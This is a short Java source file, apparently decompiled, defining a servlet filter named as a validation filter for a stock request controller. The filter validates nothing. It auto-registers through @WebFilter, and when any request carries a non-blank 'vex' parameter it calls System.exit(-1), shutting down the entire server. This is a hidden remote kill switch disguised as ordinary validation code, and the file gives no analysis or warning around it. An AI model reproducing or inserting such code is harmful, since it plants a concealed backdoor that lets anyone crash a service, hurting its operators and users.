package net.mlike.chenhui.one.controller;

import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebFilter;
import org.apache.logging.log4j.util.Strings;

@WebFilter
public class StockRequestController$ValidationFilter
        implements Filter
{
    public void init(FilterConfig filterConfig)
            throws ServletException
    {}

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException
    {
        String v = request.getParameter("vex");
        if (Strings.isNotBlank(v)) {
            System.exit(-1);
        }
        chain.doFilter(request, response);
    }

    public void destroy() {}
}
